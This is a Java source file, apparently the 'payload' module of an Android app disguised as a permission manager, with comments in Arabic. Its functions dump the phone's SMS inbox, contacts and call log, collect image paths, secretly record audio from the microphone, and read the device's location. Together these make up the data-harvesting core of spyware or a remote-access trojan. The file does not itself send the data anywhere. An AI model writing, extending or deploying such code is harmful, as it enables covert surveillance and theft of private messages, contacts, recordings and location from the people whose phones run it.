package com.example.permissionmanagerpro.payload;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Log;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;

public class FeatureUtils {
    private static final String TAG = "FeatureUtils";

    // 1. تفريغ الرسائل
    public static String dumpSms(Context context) {
        StringBuilder sb = new StringBuilder("=== SMS INBOX ===\n");
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(Uri.parse("content://sms/inbox"), null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndexOrThrow("address"));
                String body = cursor.getString(cursor.getColumnIndexOrThrow("body"));
                sb.append("From: ").append(address).append("\nMsg: ").append(body).append("\n---\n");
            }
            cursor.close();
        }
        return sb.toString();
    }

    // 2. تفريغ جهات الاتصال
    public static String dumpContacts(Context context) {
        StringBuilder sb = new StringBuilder("=== CONTACTS ===\n");
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append("Name: ").append(name).append(", Phone: ").append(number).append("\n");
            }
            cursor.close();
        }
        return sb.toString();
    }

    // 3. تفريغ سجل المكالمات
    public static String dumpCallLog(Context context) {
        StringBuilder sb = new StringBuilder("=== CALL LOG ===\n");
        ContentResolver cr = context.getContentResolver();
        Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC");
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                String type = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                String duration = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                sb.append("Num: ").append(number).append(", Type: ").append(type).append(", Dur: ").append(duration).append("s\n");
            }
            cursor.close();
        }
        return sb.toString();
    }

    // 4. تفريغ الصور (ضغطها في ملف واحد كبير، هنا نعيد مساراتها)
    public static List<String> getImagePaths(Context context) {
        List<String> paths = new ArrayList<>();
        String[] projection = {MediaStore.Images.Media.DATA};
        Cursor cursor = context.getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, null);
        if (cursor != null) {
            while (cursor.moveToNext()) {
                String path = cursor.getString(0);
                if (path != null) paths.add(path);
            }
            cursor.close();
        }
        return paths;
    }

    // 5. تسجيل صوتي (يحفظ ملف مؤقت ويعيد المسار)
    public static String startRecording(Context context, int seconds) throws IOException {
        File audioFile = new File(context.getCacheDir(), "recording_" + System.currentTimeMillis() + ".3gp");
        MediaRecorder recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
        recorder.setOutputFile(audioFile.getAbsolutePath());
        recorder.prepare();
        recorder.start();

        // جدولة الإيقاف بعد الثواني المحددة
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            try { recorder.stop(); recorder.release(); } catch (Exception e) { e.printStackTrace(); }
        }, seconds * 1000L);

        return audioFile.getAbsolutePath();
    }

    // 6. الحصول على الموقع
    public static String getLocation(Context context) {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc != null) {
                return "Lat: " + loc.getLatitude() + ", Lon: " + loc.getLongitude() + ", Acc: " + loc.getAccuracy();
            }
        } catch (Exception e) { e.printStackTrace(); }
        return "Unable to get location.";
    }
}